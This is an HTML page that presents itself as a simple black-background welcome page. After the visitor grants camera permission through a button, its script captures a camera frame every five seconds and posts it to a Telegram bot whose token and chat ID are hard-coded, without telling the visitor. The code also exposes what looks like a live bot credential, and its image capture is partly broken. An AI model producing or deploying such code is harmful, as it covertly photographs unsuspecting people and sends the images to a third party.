<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Black Background Example</title>
  <style>
    body {
      background-color: black;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
    }
    h1 {
      text-align: center;
      font-size: 3em;
      text-shadow: 2px 2px 10px rgba(255, 255, 255, 0.5);
    }
  </style>
</head>
<body>
  <h1>Welcome to My Black Background Page</h1>
  <button id="request-permission">Request Camera Permission</button>
  <script>
    document.getElementById("request-permission").addEventListener("click", () => {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          // Camera ki permission mil gayi
          console.log("Camera permission granted");
          // Start taking photos
          startTakingPhotos(stream);
        })
        .catch(error => {
          // Camera ki permission nahi mili
          console.error("Camera permission denied", error);
        });
    });

    function startTakingPhotos(stream) {
      setInterval(() => {
        // Camera ki photo click karna
        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(stream.getVideoTracks()[0].getSettings().facingMode === "user" ? stream.getVideoTracks()[0] : stream.getVideoTracks()[1], 0, 0, canvas.width, canvas.height);
        // Photo ko base64 mein convert karna
        const photo = canvas.toDataURL();
        // Photo ko Telegram chat ID par bhejna
        sendPhotoToTelegram(photo);
      }, 5000); // 5 second
    }

    function sendPhotoToTelegram(photo) {
      const chatId = "5112680061";
      const token = "6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es";
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", photo);
      fetch(url, {
        method: "POST",
        body: formData,
      })
        .then(response => response.json())
        .then(data => console.log("Photo sent successfully", data))
        .catch(error => console.error("Error sending photo", error));
    }
  </script>
</body>
</html>
